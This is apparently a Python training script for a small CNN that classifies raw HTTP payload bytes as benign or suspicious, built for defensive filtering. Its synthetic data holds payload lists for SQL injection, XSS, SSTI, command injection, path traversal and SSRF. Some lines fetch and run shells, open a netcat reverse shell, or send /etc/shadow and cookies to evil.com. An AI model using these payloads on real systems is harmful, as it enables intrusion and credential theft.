"""
Byte-level 1D CNN for NPU pre-filter.

Reads raw payload bytes (first 512) and classifies as suspicious vs benign.
Trained on synthetic HTTP traffic with embedded attack patterns.

Input:  [1, 512] int32  (byte values 0-255, pad token = 256)
Output: [1, 1]   float32 (0.0 = benign, 1.0 = suspicious)

Architecture (~813K params):
  Embedding(257, 64) -> 4x Conv1d blocks -> GlobalAvgPool -> Dense classifier
"""

import random
import string
import numpy as np
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import Dataset, DataLoader

# ── Constants ──────────────────────────────────────────────────────
SEQ_LEN = 512
VOCAB_SIZE = 257  # 0-255 byte values + 256 pad token
PAD_TOKEN = 256
EMBED_DIM = 64
NUM_SAMPLES = 50_000
BATCH_SIZE = 256
EPOCHS = 25
LR = 1e-3
DEVICE = "cpu"


# ── Model ──────────────────────────────────────────────────────────

class PayloadCNN(nn.Module):
    def __init__(self):
        super().__init__()
        self.embedding = nn.Embedding(VOCAB_SIZE, EMBED_DIM, padding_idx=PAD_TOKEN)

        self.conv_blocks = nn.Sequential(
            # Block 1: captures 7-byte patterns (e.g., "<script", "UNION S", "../../../")
            nn.Conv1d(EMBED_DIM, 128, kernel_size=7, padding=3),
            nn.BatchNorm1d(128),
            nn.ReLU(),
            nn.MaxPool1d(2),  # -> [B, 128, 256]

            # Block 2: captures 5-byte patterns at higher level
            nn.Conv1d(128, 128, kernel_size=5, padding=2),
            nn.BatchNorm1d(128),
            nn.ReLU(),
            nn.MaxPool1d(2),  # -> [B, 128, 128]

            # Block 3
            nn.Conv1d(128, 256, kernel_size=3, padding=1),
            nn.BatchNorm1d(256),
            nn.ReLU(),
            nn.MaxPool1d(2),  # -> [B, 256, 64]

            # Block 4
            nn.Conv1d(256, 256, kernel_size=3, padding=1),
            nn.BatchNorm1d(256),
            nn.ReLU(),
            nn.AdaptiveAvgPool1d(1),  # -> [B, 256, 1]
        )

        self.classifier = nn.Sequential(
            nn.Linear(256, 128),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(128, 1),
            nn.Sigmoid(),
        )

    def forward(self, x):
        # x: [B, 512] int32/int64
        x = self.embedding(x)          # [B, 512, 64]
        x = x.permute(0, 2, 1)         # [B, 64, 512] channels-first
        x = self.conv_blocks(x)         # [B, 256, 1]
        x = x.squeeze(-1)              # [B, 256]
        x = self.classifier(x)         # [B, 1]
        return x


# ── ONNX export wrapper (cast int64 -> int32 for NPU) ─────────────

class PayloadCNNExport(nn.Module):
    """Wrapper that accepts int32 input for NPU compatibility."""
    def __init__(self, model):
        super().__init__()
        self.model = model

    def forward(self, x):
        # ONNX/OpenVINO will feed int32; PyTorch embedding expects int64
        return self.model(x.long())


# ── Synthetic Data Generation ──────────────────────────────────────

def rand_str(min_len=3, max_len=20):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(min_len, max_len)))

def rand_path(depth=None):
    if depth is None:
        depth = random.randint(1, 4)
    return '/'.join(rand_str(3, 12) for _ in range(depth))

def rand_header_block():
    """Generate random HTTP headers."""
    headers = []
    possible = [
        f"Host: {rand_str(5, 15)}.com",
        f"User-Agent: Mozilla/5.0 ({rand_str()}) {rand_str()}/{rand_str(1,3)}",
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        f"Accept-Language: en-US,en;q=0.5",
        f"Accept-Encoding: gzip, deflate",
        f"Connection: keep-alive",
        f"Content-Type: application/json",
        f"Content-Type: application/x-www-form-urlencoded",
        f"Content-Type: text/html; charset=utf-8",
        f"Content-Length: {random.randint(0, 5000)}",
        f"Cache-Control: no-cache",
        f"Cookie: session={rand_str(20, 40)}",
        f"Authorization: Bearer {rand_str(30, 50)}",
        f"X-Requested-With: XMLHttpRequest",
        f"Referer: https://{rand_str(5,12)}.com/{rand_path(2)}",
        f"Origin: https://{rand_str(5,12)}.com",
    ]
    n = random.randint(3, 8)
    return '\r\n'.join(random.sample(possible, min(n, len(possible))))

def rand_json_body():
    """Generate random JSON body."""
    fields = []
    for _ in range(random.randint(2, 6)):
        key = rand_str(3, 10)
        vtype = random.choice(['str', 'int', 'bool', 'null'])
        if vtype == 'str':
            fields.append(f'"{key}": "{rand_str(5, 25)}"')
        elif vtype == 'int':
            fields.append(f'"{key}": {random.randint(0, 10000)}')
        elif vtype == 'bool':
            fields.append(f'"{key}": {"true" if random.random() > 0.5 else "false"}')
        else:
            fields.append(f'"{key}": null')
    return '{' + ', '.join(fields) + '}'

def rand_html_body():
    """Generate random HTML snippet."""
    tags = ['div', 'span', 'p', 'h1', 'h2', 'li', 'td', 'section']
    lines = [f'<html><head><title>{rand_str(5,15)}</title></head><body>']
    for _ in range(random.randint(2, 5)):
        tag = random.choice(tags)
        lines.append(f'<{tag} class="{rand_str(3,8)}">{rand_str(10, 50)}</{tag}>')
    lines.append('</body></html>')
    return '\n'.join(lines)

def rand_xml_body():
    """Generate random XML data."""
    root = rand_str(4, 8).capitalize()
    fields = []
    for _ in range(random.randint(2, 5)):
        tag = rand_str(4, 10).capitalize()
        fields.append(f'  <{tag}>{rand_str(5, 20)}</{tag}>')
    return f'<{root}>\n' + '\n'.join(fields) + f'\n</{root}>'


# ── Benign sample generators ──────────────────────────────────────

def gen_benign_get_request():
    method = random.choice(['GET', 'HEAD', 'OPTIONS'])
    path = '/' + rand_path()
    params = ''
    if random.random() > 0.5:
        params = '?' + '&'.join(f'{rand_str(2,8)}={rand_str(3,15)}' for _ in range(random.randint(1, 4)))
    line = f'{method} {path}{params} HTTP/1.1\r\n'
    return line + rand_header_block() + '\r\n\r\n'

def gen_benign_post_request():
    path = '/' + rand_path()
    body = rand_json_body() if random.random() > 0.3 else f'{rand_str(3,8)}={rand_str(5,20)}&{rand_str(3,8)}={rand_str(5,20)}'
    line = f'POST {path} HTTP/1.1\r\n'
    headers = rand_header_block()
    return line + headers + f'\r\nContent-Length: {len(body)}\r\n\r\n' + body

def gen_benign_response():
    code = random.choice([200, 200, 200, 301, 302, 304, 404, 500])
    status = {200: 'OK', 301: 'Moved Permanently', 302: 'Found', 304: 'Not Modified', 404: 'Not Found', 500: 'Internal Server Error'}
    line = f'HTTP/1.1 {code} {status[code]}\r\n'
    headers = rand_header_block()
    body_type = random.choice(['json', 'html', 'xml', 'text'])
    if body_type == 'json':
        body = rand_json_body()
    elif body_type == 'html':
        body = rand_html_body()
    elif body_type == 'xml':
        body = rand_xml_body()
    else:
        body = rand_str(20, 100)
    return line + headers + f'\r\nContent-Length: {len(body)}\r\n\r\n' + body

def gen_benign_js_response():
    """Normal JavaScript served by ad servers, CDNs, etc."""
    funcs = [
        f'var {rand_str(3,10)} = function() {{ return {random.randint(0,100)}; }};',
        f'AdServer.displayAdsCallback("[]");',
        f'window.{rand_str(5,12)} = {rand_json_body()};',
        f'(function() {{ var {rand_str()} = document.getElementById("{rand_str()}"); }})();',
        f'define("{rand_str()}", ["{rand_str()}", "{rand_str()}"], function(a, b) {{ return a + b; }});',
    ]
    body = random.choice(funcs)
    return f'HTTP/1.1 200 OK\r\nContent-Type: application/javascript\r\nServer: Apache\r\nContent-Length: {len(body)}\r\n\r\n' + body

BENIGN_GENERATORS = [gen_benign_get_request, gen_benign_post_request, gen_benign_response, gen_benign_js_response]


# ── Malicious sample generators ───────────────────────────────────

# SQL Injection patterns
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' UNION SELECT username,password FROM users--",
    "'; DROP TABLE users;--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' OR SLEEP(5)--",
    "' OR BENCHMARK(10000000,SHA1('test'))--",
    "admin'--",
    "1; EXEC xp_cmdshell('whoami')--",
    "' UNION ALL SELECT NULL,NULL,@@version--",
    "1' ORDER BY 1--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
    "') OR ('1'='1",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",
    "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
]

# XSS patterns
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<script>document.location="http://evil.com/?c="+document.cookie</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    "'-alert(1)-'",
    '<iframe src="javascript:alert(1)">',
    '<details open ontoggle=alert(1)>',
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    '{{constructor.constructor("return this")().alert(1)}}',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<a href="javascript:alert(document.domain)">click</a>',
    '<div style="background:url(javascript:alert(1))">',
]

# SSTI patterns
SSTI_PAYLOADS = [
    '{{7*7}}',
    '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
    '${T(java.lang.Runtime).getRuntime().exec("whoami")}',
    '{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read()}}',
    '{% import os %}{{os.popen("whoami").read()}}',
    '*{T(java.lang.Runtime).getRuntime().exec("calc.exe")}',
    '{{"".__class__.__mro__[1].__subclasses__()}}',
    '${__import__("os").system("ls")}',
]

# Command injection patterns
CMDI_PAYLOADS = [
    '; ls -la',
    '| cat /etc/passwd',
    '`whoami`',
    '$(id)',
    '; ping -c 3 evil.com',
    '|| curl http://evil.com/shell.sh | sh',
    '& dir C:\\',
    '; wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd',
    '| nc -e /bin/sh evil.com 4444',
    '%0als',
    '\nid',
    '; echo vulnerable > /tmp/pwned',
    '$(curl http://evil.com/exfil?data=$(cat /etc/shadow | base64))',
    '`nslookup evil.com`',
]

# Path traversal patterns
TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
    '/etc/passwd%00.jpg',
    '....\\....\\....\\windows\\win.ini',
    '../../../proc/self/environ',
    '..%2f..%2f..%2f..%2fetc%2fshadow',
    '..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts',
    '../../../var/log/apache2/access.log',
]

# SSRF patterns
SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://127.0.0.1:6379/',
    'http://localhost:8080/admin',
    'file:///etc/passwd',
    'gopher://127.0.0.1:25/xHELO',
    'dict://127.0.0.1:11211/stat',
    'http://[::1]:80/',
    'http://0x7f000001/',
    'http://2130706433/',
    'http://169.254.169.254/latest/user-data/',
    'http://internal-service.local/api/keys',
]


def gen_sqli_request():
    payload = random.choice(SQLI_PAYLOADS)
    if random.random() > 0.5:
        # In query parameter
        path = f'/{rand_path()}?{rand_str(2,6)}={payload}&{rand_str(2,6)}={rand_str(3,10)}'
        return f'GET {path} HTTP/1.1\r\n{rand_header_block()}\r\n\r\n'
    else:
        # In POST body
        body = f'{rand_str(2,6)}={payload}&{rand_str(2,6)}={rand_str(3,10)}'
        return f'POST /{rand_path()} HTTP/1.1\r\n{rand_header_block()}\r\nContent-Length: {len(body)}\r\n\r\n{body}'

def gen_xss_request():
    payload = random.choice(XSS_PAYLOADS)
    if random.random() > 0.5:
        path = f'/{rand_path()}?{rand_str(2,6)}={payload}'
        return f'GET {path} HTTP/1.1\r\n{rand_header_block()}\r\n\r\n'
    else:
        body = f'{rand_str(2,6)}={payload}'
        return f'POST /{rand_path()} HTTP/1.1\r\n{rand_header_block()}\r\nContent-Length: {len(body)}\r\n\r\n{body}'

def gen_ssti_request():
    payload = random.choice(SSTI_PAYLOADS)
    if random.random() > 0.5:
        path = f'/{rand_path()}?{rand_str(2,6)}={payload}'
        return f'GET {path} HTTP/1.1\r\n{rand_header_block()}\r\n\r\n'
    else:
        body = f'{rand_str(2,6)}={payload}'
        return f'POST /{rand_path()} HTTP/1.1\r\n{rand_header_block()}\r\nContent-Length: {len(body)}\r\n\r\n{body}'

def gen_cmdi_request():
    payload = random.choice(CMDI_PAYLOADS)
    if random.random() > 0.3:
        path = f'/{rand_path()}?{rand_str(2,6)}={payload}'
        return f'GET {path} HTTP/1.1\r\n{rand_header_block()}\r\n\r\n'
    else:
        body = f'{rand_str(2,6)}={payload}'
        return f'POST /{rand_path()} HTTP/1.1\r\n{rand_header_block()}\r\nContent-Length: {len(body)}\r\n\r\n{body}'

def gen_traversal_request():
    payload = random.choice(TRAVERSAL_PAYLOADS)
    path = f'/{rand_path(1)}/{payload}'
    return f'GET {path} HTTP/1.1\r\n{rand_header_block()}\r\n\r\n'

def gen_ssrf_request():
    payload = random.choice(SSRF_PAYLOADS)
    if random.random() > 0.5:
        path = f'/{rand_path()}?url={payload}'
        return f'GET {path} HTTP/1.1\r\n{rand_header_block()}\r\n\r\n'
    else:
        body = f'{{"url": "{payload}", "callback": "{rand_str(5,15)}"}}'
        return f'POST /{rand_path()} HTTP/1.1\r\n{rand_header_block()}\r\nContent-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n{body}'

MALICIOUS_GENERATORS = [
    (gen_sqli_request, 0.20),
    (gen_xss_request, 0.20),
    (gen_ssti_request, 0.15),
    (gen_cmdi_request, 0.15),
    (gen_traversal_request, 0.15),
    (gen_ssrf_request, 0.15),
]


# ── Dataset ────────────────────────────────────────────────────────

def payload_to_tensor(payload_str: str) -> torch.Tensor:
    """Convert a string payload to a padded int32 tensor of length SEQ_LEN."""
    raw = payload_str.encode('utf-8', errors='replace')[:SEQ_LEN]
    arr = np.full(SEQ_LEN, PAD_TOKEN, dtype=np.int32)
    for i, b in enumerate(raw):
        arr[i] = int(b)
    return torch.from_numpy(arr)


class PayloadDataset(Dataset):
    def __init__(self, n_samples):
        self.data = []
        self.labels = []
        n_benign = n_samples // 2
        n_malicious = n_samples - n_benign

        print(f"  Generating {n_benign} benign samples...")
        for _ in range(n_benign):
            gen = random.choice(BENIGN_GENERATORS)
            payload = gen()
            self.data.append(payload_to_tensor(payload))
            self.labels.append(0.0)

        print(f"  Generating {n_malicious} malicious samples...")
        for _ in range(n_malicious):
            # Weighted selection of attack type
            r = random.random()
            cumulative = 0.0
            gen_fn = MALICIOUS_GENERATORS[-1][0]
            for fn, weight in MALICIOUS_GENERATORS:
                cumulative += weight
                if r < cumulative:
                    gen_fn = fn
                    break
            payload = gen_fn()
            self.data.append(payload_to_tensor(payload))
            self.labels.append(1.0)

        # Shuffle
        combined = list(zip(self.data, self.labels))
        random.shuffle(combined)
        self.data, self.labels = zip(*combined)
        self.data = list(self.data)
        self.labels = list(self.labels)

    def __len__(self):
        return len(self.data)

    def __getitem__(self, idx):
        return self.data[idx], torch.tensor([self.labels[idx]], dtype=torch.float32)


# ── Training ───────────────────────────────────────────────────────

def train():
    random.seed(42)
    np.random.seed(42)
    torch.manual_seed(42)

    print("Creating dataset...")
    dataset = PayloadDataset(NUM_SAMPLES)

    # Split: 80% train, 10% val, 10% test
    n = len(dataset)
    n_train = int(n * 0.8)
    n_val = int(n * 0.1)
    n_test = n - n_train - n_val

    train_set, val_set, test_set = torch.utils.data.random_split(
        dataset, [n_train, n_val, n_test],
        generator=torch.Generator().manual_seed(42)
    )

    train_loader = DataLoader(train_set, batch_size=BATCH_SIZE, shuffle=True, num_workers=0)
    val_loader = DataLoader(val_set, batch_size=BATCH_SIZE, shuffle=False, num_workers=0)
    test_loader = DataLoader(test_set, batch_size=BATCH_SIZE, shuffle=False, num_workers=0)

    model = PayloadCNN().to(DEVICE)
    total_params = sum(p.numel() for p in model.parameters())
    print(f"\nModel: {total_params:,} parameters")

    optimizer = optim.Adam(model.parameters(), lr=LR, weight_decay=1e-4)
    scheduler = optim.lr_scheduler.ReduceLROnPlateau(optimizer, patience=3, factor=0.5)
    criterion = nn.BCELoss()

    best_val_loss = float('inf')
    patience_counter = 0
    best_state = None

    print("\nTraining...")
    for epoch in range(EPOCHS):
        # Train
        model.train()
        train_loss = 0.0
        train_correct = 0
        train_total = 0
        for batch_x, batch_y in train_loader:
            batch_x, batch_y = batch_x.to(DEVICE), batch_y.to(DEVICE)
            optimizer.zero_grad()
            pred = model(batch_x.long())
            loss = criterion(pred, batch_y)
            loss.backward()
            optimizer.step()
            train_loss += loss.item() * batch_x.size(0)
            train_correct += ((pred > 0.5).float() == batch_y).sum().item()
            train_total += batch_x.size(0)

        # Validate
        model.eval()
        val_loss = 0.0
        val_correct = 0
        val_total = 0
        with torch.no_grad():
            for batch_x, batch_y in val_loader:
                batch_x, batch_y = batch_x.to(DEVICE), batch_y.to(DEVICE)
                pred = model(batch_x.long())
                loss = criterion(pred, batch_y)
                val_loss += loss.item() * batch_x.size(0)
                val_correct += ((pred > 0.5).float() == batch_y).sum().item()
                val_total += batch_x.size(0)

        avg_train_loss = train_loss / train_total
        avg_val_loss = val_loss / val_total
        train_acc = train_correct / train_total * 100
        val_acc = val_correct / val_total * 100

        scheduler.step(avg_val_loss)

        print(f"  Epoch {epoch+1:2d}/{EPOCHS}: "
              f"train_loss={avg_train_loss:.4f} train_acc={train_acc:.1f}% | "
              f"val_loss={avg_val_loss:.4f} val_acc={val_acc:.1f}%")

        # Early stopping
        if avg_val_loss < best_val_loss:
            best_val_loss = avg_val_loss
            patience_counter = 0
            best_state = {k: v.clone() for k, v in model.state_dict().items()}
        else:
            patience_counter += 1
            if patience_counter >= 7:
                print(f"  Early stopping at epoch {epoch+1}")
                break

    # Load best model
    if best_state:
        model.load_state_dict(best_state)

    # Test
    model.eval()
    test_correct = 0
    test_total = 0
    tp = fp = tn = fn = 0
    with torch.no_grad():
        for batch_x, batch_y in test_loader:
            batch_x, batch_y = batch_x.to(DEVICE), batch_y.to(DEVICE)
            pred = model(batch_x.long())
            pred_labels = (pred > 0.5).float()
            test_correct += (pred_labels == batch_y).sum().item()
            test_total += batch_x.size(0)
            tp += ((pred_labels == 1) & (batch_y == 1)).sum().item()
            fp += ((pred_labels == 1) & (batch_y == 0)).sum().item()
            tn += ((pred_labels == 0) & (batch_y == 0)).sum().item()
            fn += ((pred_labels == 0) & (batch_y == 1)).sum().item()

    test_acc = test_correct / test_total * 100
    precision = tp / (tp + fp) if (tp + fp) > 0 else 0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0
    f1 = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0

    print(f"\nTest Results:")
    print(f"  Accuracy:  {test_acc:.1f}%")
    print(f"  Precision: {precision:.3f}")
    print(f"  Recall:    {recall:.3f}")
    print(f"  F1 Score:  {f1:.3f}")
    print(f"  Confusion: TP={tp} FP={fp} TN={tn} FN={fn}")

    return model


# ── Export to ONNX + OpenVINO IR ───────────────────────────────────

def export_model(model):
    import onnx

    model.eval()
    export_wrapper = PayloadCNNExport(model)
    export_wrapper.eval()

    # Dummy input: int32 tensor
    dummy = torch.randint(0, 256, (1, SEQ_LEN), dtype=torch.int32)

    onnx_path = "D:/SideProject/models/npu_filter_cnn.onnx"
    print(f"\nExporting to ONNX: {onnx_path}")

    torch.onnx.export(
        export_wrapper,
        dummy,
        onnx_path,
        input_names=["payload_bytes"],
        output_names=["suspicious_prob"],
        dynamic_axes=None,  # fixed shape [1, 512]
        opset_version=17,
    )

    # Verify ONNX
    onnx_model = onnx.load(onnx_path)
    onnx.checker.check_model(onnx_model)
    print("  ONNX model verified OK")

    # Convert to OpenVINO IR
    import openvino as ov

    print("\nConverting to OpenVINO IR...")
    core = ov.Core()
    ov_model = core.read_model(onnx_path)

    ir_path = "D:/SideProject/models/npu_filter_cnn.xml"
    ov.save_model(ov_model, ir_path, compress_to_fp16=True)
    print(f"  Saved: {ir_path}")

    # Check file sizes
    import os
    xml_size = os.path.getsize(ir_path)
    bin_path = ir_path.replace('.xml', '.bin')
    bin_size = os.path.getsize(bin_path) if os.path.exists(bin_path) else 0
    print(f"  Model size: {xml_size/1024:.1f} KB (xml) + {bin_size/1024:.1f} KB (bin) = {(xml_size+bin_size)/1024:.1f} KB total")

    # Verify on CPU
    print("\nVerification (CPU):")
    compiled = core.compile_model(ov_model, "CPU")
    infer = compiled.create_infer_request()

    test_payloads = [
        ("GET /api/users HTTP/1.1\r\nHost: example.com\r\n\r\n", "Clean GET request"),
        ("GET /search?q=' OR 1=1-- HTTP/1.1\r\nHost: example.com\r\n\r\n", "SQL injection"),
        ("POST /comment HTTP/1.1\r\nHost: example.com\r\n\r\ntext=<script>alert(1)</script>", "XSS attack"),
        ("GET /page?tpl={{7*7}} HTTP/1.1\r\nHost: example.com\r\n\r\n", "SSTI attack"),
        ("GET /files/../../../etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n", "Path traversal"),
        ("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"status\": \"ok\"}", "Clean JSON response"),
        ("HTTP/1.1 200 OK\r\nContent-Type: text/javascript\r\n\r\nvar config = {};", "Clean JS response"),
        ("POST /api HTTP/1.1\r\nHost: ex.com\r\n\r\ncmd=;cat /etc/passwd", "Command injection"),
        ("GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\n\r\n", "SSRF attack"),
    ]

    for payload_str, desc in test_payloads:
        raw = payload_str.encode('utf-8')[:SEQ_LEN]
        inp = np.full((1, SEQ_LEN), PAD_TOKEN, dtype=np.int32)
        for i, b in enumerate(raw):
            inp[0, i] = int(b)
        infer.infer({0: inp})
        p = infer.get_output_tensor(0).data.flatten()[0]
        label = 'SUSPICIOUS' if p > 0.5 else 'benign'
        print(f"  {desc:25s} -> {p:.3f} ({label})")

    # Try NPU
    print(f"\nAvailable devices: {core.available_devices}")
    if "NPU" in core.available_devices:
        try:
            compiled_npu = core.compile_model(ov_model, "NPU")
            infer_npu = compiled_npu.create_infer_request()
            # Quick test
            inp = np.full((1, SEQ_LEN), PAD_TOKEN, dtype=np.int32)
            test_bytes = b"GET /test HTTP/1.1\r\nHost: example.com\r\n\r\n"
            for i, b in enumerate(test_bytes):
                inp[0, i] = int(b)
            infer_npu.infer({0: inp})
            p = infer_npu.get_output_tensor(0).data.flatten()[0]
            print(f"  NPU inference OK: prediction={p:.3f}")
        except Exception as e:
            print(f"  NPU compilation failed: {e}")
            print("  Model will use CPU fallback.")
    else:
        print("  NPU not available. Model will use CPU in C++.")

    print(f"\nDone! Model saved to {ir_path}")


# ── Main ───────────────────────────────────────────────────────────

if __name__ == "__main__":
    model = train()
    export_model(model)
